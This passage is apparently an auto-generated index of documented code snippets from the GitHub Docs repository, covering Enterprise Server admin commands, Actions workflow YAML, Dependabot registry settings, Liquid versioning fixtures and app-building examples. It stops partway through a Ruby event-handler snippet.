https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-remove-node --no-evacuate NODE-HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Using Wildcards for Action/Workflow Patterns\nDESCRIPTION: Demonstrates how to use the `*` wildcard character to match patterns when specifying allowed actions and reusable workflows. This allows you to create broader rules to include multiple organizations or repositories. Use `,` to separate patterns.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/allow-specific-actions-intro.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nspace-org/*\n```\n\nLANGUAGE: text\nCODE:\n```\n*/octocat**@*\n```\n\nLANGUAGE: text\nCODE:\n```\noctocat/*, octokit/*\n```\n\n----------------------------------------\n\nTITLE: Serving Jekyll site with empty baseurl\nDESCRIPTION: This code snippet demonstrates how to serve a Jekyll site locally, overriding the `baseurl` setting in the `_config.yml` file. This is useful when the `baseurl` is set to the GitHub repository link, allowing the site to be served at `localhost:4000/`. Requires Bundler.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/testing-your-github-pages-site-locally-with-jekyll.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbundle exec jekyll serve --baseurl=\"\"\n```\n\n----------------------------------------\n\nTITLE: Ignoring Specific Versions of Dependencies - YAML\nDESCRIPTION: This code snippet demonstrates how to ignore specific versions or ranges of versions of dependencies using the `versions` option in conjunction with `ignore`. It provides examples for ignoring a specific version of Django and version ranges for Node types, xdg-basedir, and limiter.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nignore:\n  - dependency-name: \"django*\"\n    # Ignore version 11\n    versions: [ \"11\" ]\n```\n\nLANGUAGE: yaml\nCODE:\n```\nignore:\n  - dependency-name: \"@types/node\"\n    versions: [\"15.x\", \"14.x\", \"13.x\"]\n  - dependency-name: \"xdg-basedir\"\n    # 5.0.0 has breaking changes as they switch to named exports\n    # and convert the module to ESM\n    # We can't use it until we switch to ESM across the project\n    versions: [\"5.x\"]\n  - dependency-name: \"limiter\"\n    # 2.0.0 has breaking changes\n    # so we want to delay updating.\n    versions: [\"2.x\"]\n```\n\n----------------------------------------\n\nTITLE: Setting TTL for warn state using nes set-node-ttl\nDESCRIPTION: This snippet demonstrates how to set the Time To Live (TTL) setting for the `warn` state of the Node Eligibility Service (NES) using the `nes set-node-ttl` command. Replace MINUTES with the desired TTL value in minutes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-ttl warn MINUTES\n```\n\n----------------------------------------\n\nTITLE: Poll for Access Token\nDESCRIPTION: This snippet demonstrates how to poll the `/login/oauth/access_token` endpoint to complete the device authorization flow. It requires `client_id`, `device_code`, and `grant_type` query parameters. The `grant_type` must be `urn:ietf:params:oauth:grant-type:device_code`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST {% data variables.product.oauth_host_code %}/login/oauth/access_token?client_id=CLIENT_ID&device_code=DEVICE_CODE&grant_type=urn:ietf:params:oauth:grant-type:device_code\n```\n\n----------------------------------------\n\nTITLE: Adding More Repositories to Existing Export\nDESCRIPTION: This code snippet demonstrates how to add another repository to an existing migration using the `ghe-migrator add` command with the `-g` flag followed by the Migration GUID. The repository's URL is required.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator add https://HOSTNAME/USERNAME/OTHER-REPO-NAME -g MIGRATION-GUID --lock\n```\n\n----------------------------------------\n\nTITLE: Generate ECS Task Definition Skeleton - AWS CLI\nDESCRIPTION: This command generates a skeleton JSON structure for an Amazon ECS task definition using the AWS CLI. This output can be used as a template for creating your task definition file. It requires the AWS CLI to be installed and configured with appropriate permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-amazon-elastic-container-service.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\naws ecs register-task-definition --generate-cli-skeleton\n```\n\n----------------------------------------\n\nTITLE: Running index-general-autocomplete with help flag in bash\nDESCRIPTION: This command executes the `index-general-autocomplete` script with the `--help` flag. The `--help` flag displays the available arguments and options for the script, providing information on how to configure and run it effectively. The expected output is a list of available arguments.\nSOURCE: https://github.com/github/docs/blob/main/src/search/scripts/index/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run index-general-autocomplete -- --help\n```\n\n----------------------------------------\n\nTITLE: Generating SHA1 Thumbprint with OpenSSL\nDESCRIPTION: This command retrieves the SHA1 thumbprint of the GitHub Enterprise Server certificate using OpenSSL. It's used for configuring the Amazon OIDC provider. Replace `HOSTNAME` with the public hostname of the GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/enabling-github-actions-for-github-enterprise-server/enabling-github-actions-with-amazon-s3-storage.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nopenssl s_client -connect HOSTNAME:443 < /dev/null 2>/dev/null | openssl x509 -fingerprint -noout -sha1 -in /dev/stdin\n```\n\n----------------------------------------\n\nTITLE: Configuring npm registry with Nexus for Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to use a Nexus npm registry. It defines the registry type as `npm-registry`, provides the URL of the registry, and specifies the token for authentication. The token is expected to be stored as a secret in the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  npm-nexus:\n    type: npm-registry\n    url: https://registry.example.com/repository/npm-internal/\n    token: ${{secrets.NEXUS_NPM_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Cloning Wiki Repository with Git\nDESCRIPTION: Clones a GitHub wiki repository to a local machine using the `git clone` command. This allows users to make changes locally and push them to the remote wiki. The URL should point to the `.wiki.git` endpoint.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/documenting-your-project-with-wikis/adding-or-editing-wiki-pages.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git clone https://github.com/YOUR-USERNAME/YOUR-REPOSITORY.wiki.git\n# Clones the wiki locally\n```\n\n----------------------------------------\n\nTITLE: Audit Travis CI with Config File\nDESCRIPTION: This command audits a Travis CI instance using a specified YAML configuration file.  It requires the output directory and the path to the configuration file. The configuration file should contain repository slugs and paths to .travis.yml files.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit travis-ci --output-dir ./path/to/output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\n----------------------------------------\n\nTITLE: Analyze Git Traffic (ghe-governor)\nDESCRIPTION: This utility helps analyze Git traffic by querying Governor data files located under `/data/user/gitmon`. It provides subcommands for aggregating, summarizing, and dumping Git operation data. The `-h` flag displays usage information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_60\n\nLANGUAGE: bash\nCODE:\n```\nghe-governor <subcommand> <column> [options]\n```\n\n----------------------------------------\n\nTITLE: Repository Dispatch Event Payload Example (JSON)\nDESCRIPTION: This JSON payload is an example of a `repository_dispatch` event's `client_payload`. The `versions` array contains the values that will be used to generate the matrix in the workflow. The `event_type` key specifies the type of event being dispatched.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-from-context.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"event_type\": \"test\",\n  \"client_payload\": {\n    \"versions\": [12, 14, 16]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables in PowerShell Core\nDESCRIPTION: This YAML configuration shows how to set an environment variable using PowerShell Core (version 6 and higher).  The example showcases setting a path using `>>` to the `$env:GITHUB_PATH` file. Requires the `windows-latest` runner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  powershell-core-example:\n    runs-on: windows-latest\n    steps:\n      - shell: pwsh\n        run: |\n          \"mypath\" >> $env:GITHUB_PATH\n\n```\n\n----------------------------------------\n\nTITLE: Creating a table with varied column widths\nDESCRIPTION: This snippet illustrates creating a table with varying column widths. The alignment of content within the Markdown source does not affect the rendered table. Each column in the header row must contain at least three hyphens.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n| Command | Description |\n| --- | --- |\n| git status | List all new or modified files |\n| git diff | Show file differences that haven't been staged |\n```\n\n----------------------------------------\n\nTITLE: Viewing LFS Pointer File Example\nDESCRIPTION: This snippet shows the contents of a pointer file that represents a large file managed by Git LFS. It includes the LFS version, object ID (SHA-256 hash), and the size of the actual file.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/collaboration-with-git-large-file-storage.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n+version https://git-lfs.github.com/spec/vi\n+id sha256:7194bdd797bde471a6e29b4fa9c8c2278b3c4dadfc5cb2c36d7f4531dc6cb8f\n+size 17330\n```\n\n----------------------------------------\n\nTITLE: Filtering Queries by ID using Regular Expression - YAML\nDESCRIPTION: This example uses a regular expression to exclude queries. It excludes any query whose ID starts with `cpp/cleartext-` from the `codeql/cpp-queries` suite. This is more flexible, but also potentially more brittle if query IDs change.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n- qlpack: codeql/cpp-queries\n- exclude:\n    id:\n      - /^cpp\\/cleartext-.*/\n```\n\n----------------------------------------\n\nTITLE: Video Metadata Template\nDESCRIPTION: This is a template for adding video metadata to GitHub Docs. It includes fields for the title, URL, description, product, versions, date added, location, and transcript. The template ensures consistency across all video metadata entries.\nSOURCE: https://github.com/github/docs/blob/main/contributing/videos-in-docs.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nTitle: Video title\nURL: YouTube.com/\nDescription: One sentence\nProduct: e.x. Projects\nVersions: e.x. fpt, GHES > 3.2\nDate added: YYYY-MM-DD\nLocation: /where/in/docs\nTranscript: ./content/video-transcripts/filename\n```\n\n----------------------------------------\n\nTITLE: Setting UTF-8 Encoding in _config.yml (YAML)\nDESCRIPTION: This code snippet demonstrates how to enforce UTF-8 encoding in a Jekyll site by adding the `encoding: UTF-8` line to the `_config.yml` file. This is crucial for sites using non-Latin characters. This ensures proper display of characters.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/troubleshooting-jekyll-build-errors-for-github-pages-sites.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nencoding: UTF-8\n```\n\n----------------------------------------\n\nTITLE: Adding Remote Repository in Shell\nDESCRIPTION: This shell command adds a remote repository named `origin` to the local Git repository. The URL depends on whether the repository is on GitHub.com or GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n{% ifversion fpt or ghec %}\ngit remote add origin https://github.com/USER/REPOSITORY.git\n{% else %}\ngit remote add origin https://HOSTNAME/USER/REPOSITORY.git\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Table with row headers using Liquid\nDESCRIPTION: This snippet demonstrates how to use the `rowheaders` Liquid tag to convert the first column of a Markdown table into `<th>` elements, effectively creating row headers. The tag wraps the table content. The output will be an HTML table with the first column as headers.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/table-row-headers.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% rowheaders %}\n\n|Preferences|Tom|Dick|Harry|\n|---|---|---|---|\n|Favorite fruit| Banana  | Apple | Mango\n|Football or soccer|Soccer|Football|Sportsball??\n\n{% endrowheaders %}\n```\n\n----------------------------------------\n\nTITLE: Specifying Enterprise Runner Group in Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to specify a runner group named 'my-group' within an enterprise scope using the `runs-on` directive. The `group` key is set to 'ent/my-group' to target the enterprise runner group. The snippet also includes example labels.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/using-prefixes-to-differentiate-runner-groups.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nruns-on:\n  group: ent/my-group\n  labels: [ self-hosted, label-1 ]\n```\n\n----------------------------------------\n\nTITLE: Markdown Note Alert Formatting\nDESCRIPTION: This snippet demonstrates the correct Markdown syntax for creating a 'Note' alert within GitHub documentation. It uses a blockquote with the '[!NOTE]' label to denote the alert type. This style is used to provide additional context that users may find helpful.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n> [!NOTE]\n> Keep this in mind.\n```\n\n----------------------------------------\n\nTITLE: Limiting Allowed Actions with `--allowed-actions` (Shell)\nDESCRIPTION: Specifies a list of actions to allow in converted workflows using the `--allowed-actions` parameter. Wildcards are supported. Any actions other than those provided will be disallowed. An empty list disallows all actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n--allowed-actions {% data reusables.actions.action-checkout %} actions/upload-artifact@* my-org/*\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering (GHES > 2.13 with Else) - Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering using the `ifversion` tag with an `else` clause. It checks if the GHES version is greater than 2.13 and if the product is not FPT. If true, it renders 'Alpha'; otherwise, it renders 'Bravo'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than1.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes > 2.13 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with FPT and GHES version check using Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering based on the product being FPT and the GHES version. If the product is FPT, \"Alpha\" is rendered, and if the GHES version is also 2.13, \"Bravo\" is rendered. Otherwise, \"Charlie\" is displayed.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% ifversion ghes = 2.13 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Repackage Git Repository with Prune (ghe-repo-gc --prune)\nDESCRIPTION: This command repackages a git repository network and prunes unreachable Git objects that are not referenced. It is used for removing sensitive data from a repository. Requires the USERNAME/REPONAME as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_64\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo-gc USERNAME/REPONAME\n```\n\n----------------------------------------\n\nTITLE: Verifying DNS Configuration against Authoritative Name Server - Shell\nDESCRIPTION: This command uses the `dig` utility to verify the DNS TXT record directly against the authoritative name server for a specified domain. Replace `DOMAIN` with the actual domain and `AUTHORITATIVE-NAMESERVER` with the correct server address.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/verifying-or-approving-a-domain-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ndig DOMAIN +nostats +nocomments +nocmd TXT @AUTHORITATIVE-NAMESERVER\n```\n\n----------------------------------------\n\nTITLE: Adding Dotenv Gem (Shell)\nDESCRIPTION: This command adds the Dotenv gem to the project's `Gemfile`. Dotenv is used to load environment variables from a `.env` file, which is useful for storing configuration settings like client IDs and secrets.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbundle add dotenv\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES version using Liquid\nDESCRIPTION: This snippet demonstrates how to conditionally display the text \"Alpha\" if the GitHub Enterprise Server version is exactly 2.13. The `ifversion ghes = 2.13` tag checks the GHES version and renders the content within if the condition is true.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes = 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Restarting a Codespace using GitHub CLI in the Browser\nDESCRIPTION: This snippet shows how to restart a codespace using the `gh codespace open --web` command, which will open the codespace in the browser. It requires the GitHub CLI to be installed and configured. When executed, it will prompt the user to select the codespace they wish to restart.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/stopping-and-starting-a-codespace.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace open --web\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution Using Contexts\nDESCRIPTION: This YAML snippet demonstrates using the `if` conditional to control step execution based on GitHub Actions contexts. The step only runs when the event is a `pull_request` and the action is `unassigned`. It uses the `github.event_name` and `github.event.action` contexts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: My first step\n    if: ${{ github.event_name == 'pull_request' && github.event.action == 'unassigned' }}\n    run: echo This event is a pull request that had an assignee removed.\n```\n\n----------------------------------------\n\nTITLE: Updating Redis Master in cluster.conf\nDESCRIPTION: This snippet demonstrates how to update the `redis-master` value in the `cluster.conf` file to point to a newly provisioned cluster node. The new node will then be designated as the primary Redis node. This update is crucial for redirecting Redis operations to the new primary node after a replacement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/replacing-a-cluster-node-replacement-name.md#_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\nredis-master = <em>ghe-replacement-data-node-1</em>\n```\n\n----------------------------------------\n\nTITLE: Excluding Files with Wildcard in YAML\nDESCRIPTION: This YAML snippet demonstrates how to exclude files matching a wildcard pattern from secret scanning. Specifically, it excludes JavaScript files (`.js`) located in the `foo/bar/` directory. This is achieved using the `paths-ignore` configuration with a wildcard character (`*`) in the path.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/using-advanced-secret-scanning-and-push-protection-features/excluding-folders-and-files-from-secret-scanning.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\npaths-ignore:\n  - \"foo/bar/*.js\"\n```\n\n----------------------------------------\n\nTITLE: Adding to System Path - Bash\nDESCRIPTION: This bash script adds the user's `$HOME/.local/bin` directory to the system `PATH` variable within a GitHub Actions workflow. This makes executables in that directory available to subsequent actions in the current job. The updated path variable is accessed via the `$GITHUB_PATH` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_52\n\nLANGUAGE: bash\nCODE:\n```\necho \"$HOME/.local/bin\" >> \"$GITHUB_PATH\"\n```\n\n----------------------------------------\n\nTITLE: Previous Shared storage billing response example\nDESCRIPTION: This is an example of the JSON response from the previous billing platform for shared storage billing.  It shows the structure and properties of the response, including days left in billing cycle, estimated paid storage for month, and estimated storage for month.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{ \"days_left_in_billing_cycle\": 20, \"estimated_paid_storage_for_month\": 15, \"estimated_storage_for_month\": 40 }\n```\n\n----------------------------------------\n\nTITLE: Using `includeGuides` in YAML\nDESCRIPTION: This snippet demonstrates how to use the `includeGuides` frontmatter property to include a list of articles.  It's applicable when the `layout` is set to `product-guides`. The list includes relative paths to the articles to be included.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nincludeGuides:\n  - /actions/guides/about-continuous-integration\n  - /actions/guides/setting-up-continuous-integration-using-workflow-templates\n  - /actions/guides/building-and-testing-nodejs\n  - /actions/guides/building-and-testing-powershell\n```\n\n----------------------------------------\n\nTITLE: SSH connection string with conditional hostname\nDESCRIPTION: This text snippet demonstrates a conditional hostname replacement based on the product version. If the version is `ghes`, the `HOSTNAME` placeholder will be used and dynamically replaced based on the user's hostname. Otherwise, it defaults to `github.com`.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/replace-domain.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nssh handle@{% ifversion ghes %}HOSTNAME{% else %}github.com{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Copy OpenAPI Release Configuration (Shell)\nDESCRIPTION: Copies an existing OpenAPI release configuration file to create a new configuration file for the target GHES release.  Requires shell access within the `github/github` repository. Replace `LATEST-VERSION` and `VERSION-TO-RELEASE` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-5.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncp app/api/description/config/releases/ghes-LATEST-VERSION.yaml app/api/description/config/releases/ghes-VERSION-TO-RELEASE.yaml\n```\n\n----------------------------------------\n\nTITLE: Input Element Example\nDESCRIPTION: This YAML snippet shows the `input` element for single-line text input in a form.  It defines attributes such as `label`, `description`, and `placeholder`, along with a `required` validation to ensure the field is filled.  The `id` attribute is used as an identifier for the element.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nbody:\n- type: input\n  id: prevalence\n  attributes:\n    label: Bug prevalence\n    description: \"How often do you or others encounter this bug?\"\n    placeholder: \"Example: Whenever I visit the personal account page (1-2 times a week)\"\n  validations:\n    required: true\n```\n\n----------------------------------------\n\nTITLE: Setting organization secret via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set a secret for an organization using GitHub CLI. The `--org` flag specifies the organization. Requires GitHub CLI and `admin:org` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set --org ORG_NAME SECRET_NAME\n```\n\n----------------------------------------\n\nTITLE: Protected Branch Update Error Message\nDESCRIPTION: This code snippet shows the error message a collaborator receives when attempting to merge a pull request with pending or rejected reviews into a protected branch. The error indicates that changes have been requested and the protected branch update has failed.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nremote: error: GH006: Protected branch update failed for refs/heads/main.\nremote: error: Changes have been requested.\n```\n\n----------------------------------------\n\nTITLE: Importing Subversion History and File Data to Git\nDESCRIPTION: This command imports Subversion history and file data into a Git branch. It performs a straight copy of the tree, ignoring trunk/branch distinctions. Refer to the documentation for more details.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_81\n\nLANGUAGE: shell\nCODE:\n```\ngit-import-svn-raw\n```\n\n----------------------------------------\n\nTITLE: Cloning GitHub Copilot Plugin for Vim (Windows)\nDESCRIPTION: This shell command clones the GitHub Copilot plugin repository into the appropriate directory for Vim on Windows using Git Bash. The command utilizes `git clone` to download the repository from GitHub and `$HOME` to indicate user home directory.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/copilot.vim.git \\\n$HOME/vimfiles/pack/github/start/copilot.vim\n```\n\n----------------------------------------\n\nTITLE: Showing Repository Storage Servers (ghe-spokesctl routes)\nDESCRIPTION: This subcommand of `ghe-spokesctl` displays the servers where a repository is stored. It provides information about the replication and distribution of repository data.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_49\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl routes\n```\n\n----------------------------------------\n\nTITLE: Pulling MinIO Client Docker Image (Shell)\nDESCRIPTION: This command pulls the official MinIO client (mc) Docker image from Docker Hub. This client is used to interact with the MinIO server, such as creating buckets. Requires Docker to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ndocker pull minio/mc\n```\n\n----------------------------------------\n\nTITLE: Retrieving Organization Members with REST\nDESCRIPTION: This REST API call retrieves a list of all members of an organization. The response payload may contain more data than is required, especially if only specific fields like names and avatars are needed.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -v {% data variables.product.rest_url %}/orgs/:org/members\n```\n\n----------------------------------------\n\nTITLE: Variable Definition in Azure Pipelines YAML\nDESCRIPTION: This YAML snippet defines a variable named 'one' within a 'templates/vars.yml' file.  The variable is assigned the string value 'simple_step.yml', which is then used in another YAML file to dynamically construct a file path.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n# File: templates/vars.yml\nvariables:\n  one: 'simple_step.yml'\n```\n\n----------------------------------------\n\nTITLE: Using Feature in Frontmatter YAML\nDESCRIPTION: This YAML snippet demonstrates how to specify a feature ('meow') within the frontmatter of a content file. It also includes version specifications for fpt, ghec, and ghes. The feature is associated with specific versions of the product.\nSOURCE: https://github.com/github/docs/blob/main/data/features/README.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghec: '*'\n  ghes: '>3.1'\n  feature: 'meow'\n```\n\n----------------------------------------\n\nTITLE: Configuring Hex Repository\nDESCRIPTION: This snippet configures access to a Hex repository, defining the repository name, URL, authentication key, and public key fingerprint.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_9\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n   github-hex-repository:\n     type: hex-repository\n     repo: private-repo\n     url: https://private-repo.example.com\n     auth-key: ${{secrets.MY_AUTH_KEY}}\n     public-key-fingerprint: ${{secrets.MY_PUBLIC_KEY_FINGERPRINT}}\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Certificate with Source Address Restriction\nDESCRIPTION: This command generates an SSH certificate with a source-address restriction, limiting the IP addresses from which the certificate can be used to access the organization's resources. The certificate will be valid for 1 day.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nssh-keygen -s ./ca-key -V '+1d' -I KEY-IDENTITY -O extension:login@{% data variables.product.product_url %}=USERNAME -O source-address=COMMA-SEPARATED-LIST-OF-IP-ADDRESSES-OR-RANGES ./user-key.pub\n```\n\n----------------------------------------\n\nTITLE: Installing smee-client globally using npm\nDESCRIPTION: This command installs the smee-client package globally using npm (Node Package Manager). smee-client is used to forward webhooks from a service like smee.io to your local development environment.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --global smee-client\n```\n\n----------------------------------------\n\nTITLE: Handling Check Run Events in Event Handler - Ruby\nDESCRIPTION: This code snippet demonstrates how to handle `check_run` events in the event handler, specifically for `created` and `rerequested` actions. It ensures the event is for the correct app ID and then calls the appropriate methods (`initiate_check_run` or `create_check_run`). It depends on the `@payload` and `APP_IDENTIFIER` variables.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_26\n\nLANGUAGE: Ruby\nCODE:\n```\n    when 'check_run'\n      # Check that the event is being sent to this app\n      if @payload['check_run']['app']['id'].to_s === APP_IDENTIFIER\n        case @payload['action']\n        when 'created'\n          initiate_check_run\n        when 'rerequested'\n          